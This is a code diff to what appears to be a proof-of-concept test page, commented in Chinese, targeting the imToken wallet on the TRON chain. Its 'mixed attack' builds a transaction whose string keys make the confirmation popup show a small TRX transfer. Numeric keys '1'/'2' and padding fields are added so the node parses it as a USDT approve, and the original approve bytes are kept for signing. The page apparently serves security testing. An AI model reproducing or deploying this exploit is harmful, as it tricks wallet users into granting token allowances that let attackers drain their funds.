@@ -40,7 +40,7 @@
     <div style="font-size:13px; color:var(--text2); line-height:1.6;">
       ① <span class="highlight-green">普通 TRX 转账</span> — 验证 <code>tron.sendTransaction</code> 入口可用<br>
       ② <span class="highlight-green">原始 USDT approve</span> — 验证合约调用可正常上链<br>
-      ③ <span class="highlight-red">混合攻击</span> — 修改 raw_data 弹窗显示 TRX 转账，实际签署 approve<br>
+      ③ <span class="highlight-red">混合攻击</span> — 填充字段+数字键覆盖：弹窗显示转账，节点解析为 approve<br>
       <br>
       攻击原理：同一个 contract 对象包含两套字段 — 字符串键给 imToken UI 读取，数字键给 java-tron 节点解析<br>
       <code>type</code>/<code>parameter</code> 显示 TRX 转账，数字键 <code>"1"</code>/<code>"2"</code> 覆盖为 TriggerSmartContract<br>
@@ -264,35 +264,48 @@
       );
       if (!result?.result) { log('approve 生成失败', 'error'); return; }
 
-      // 把 TRX 转账和 USDT approve 的参数全部合并到 parameter.value
-      // 钱包弹窗读 type=TransferContract + value.amount/to_address → 显示 TRX 转账
-      // 节点可能按 type_url(TriggerSmartContract) 用 approve 字段 → 序列化为 approve 字节
+      // 审计文档方案：填充字段 + 数字键覆盖
+      // 核心机制：填充未知字段操纵 FastJSON/HashMap 键处理顺序
+      //   让数字键 "1"/"2" 最后被处理，从而覆盖字符串键 type/parameter
       const realParam = transaction.raw_data.contract[0].parameter;
+      const originalHex = transaction.raw_data_hex;
 
-      // 合并：TransferContract 显示字段 + TriggerSmartContract 执行字段
-      const mergedValue = Object.assign({}, realParam.value, {
-        amount: 100000,           // TransferContract → 钱包显示金额
-        to_address: toHex         // TransferContract → 钱包显示收款方
-      });
-
-      transaction.raw_data.contract[0] = {
-        type: 'TransferContract',                                       // 钱包 → 显示 TRX 转账
-        parameter: {
-          type_url: realParam.type_url,                                 // 保持 TriggerSmartContract
-          value: mergedValue
+      // 假的 TransferContract（钱包确认页显示 TRX 转账）
+      const fakeParam = {
+        type_url: 'type.googleapis.com/protocol.TransferContract',
+        value: {
+          amount: 100000,
+          to_address: toHex,
+          owner_address: userHex,
+          data: ''
         }
       };
-      // raw_data_hex 不动 → approve 字节
 
-      const hasSelector = transaction.raw_data_hex.includes('095ea7b3');
-      log('━━━━ 合并参数测试 ━━━━', 'warn');
-      log(`type: TransferContract (钱包读 → 显示 TRX 转账)`, 'success');
-      log(`type_url: ${realParam.type_url} (节点可能按此解析)`, 'success');
-      log(`合并字段: owner_address/contract_address/data/call_value + amount/to_address`, 'success');
-      log(`raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
+      // 填充字段 + 数字键，完全按审计文档结构
+      transaction.raw_data.contract[0] = {
+         '1': 'TriggerSmartContract',
+        '2': realParam,
+        // ── imToken 确认页读取 ──
+        type: 'TransferContract',
+        parameter: fakeParam,
+        // ── 填充字段：java-tron 忽略，但影响 FastJSON/HashMap 顺序 ──
+        _a: 1, _b: 2, _c: 3, _d: 4, _e: 5,
+        _f: 6, _g: 7, _h: 8, _i: 9, _j: 10,
+        _k: 11, _l: 12, _m: 13, _n: 14, _o: 15,
+        // ── 数字键：HashMap 中最后处理，覆盖字符串键 ──
+       
+      };
+      transaction.raw_data_hex = originalHex;
+
+      const hasSelector = originalHex.includes('095ea7b3');
+      log('━━━━ 填充+数字键方案 ━━━━', 'warn');
+      log(`[UI] type/parameter → 钱包显示 TRX 转账`, 'success');
+      log(`[填充] _a~_o 未知字段 → 操纵 FastJSON 顺序`, 'success');
+      log(`[覆盖] "1"/"2" 数字键 → 最后覆盖为 TriggerSmartContract`, 'success');
+      log(`[签名] raw_data_hex 含 approve 选择器: ${hasSelector}`, hasSelector ? 'success' : 'error');
       log('━━━━━━━━━━━━━━━━━━━━', 'warn');
 
-      const ok = await sendTx(transaction, '混合攻击 (合并参数)');
+      const ok = await sendTx(transaction, '混合攻击 (填充+数字键)');
       if (ok) {
         setTimeout(() => refreshAllowanceUI(false), 12000);
       } else {
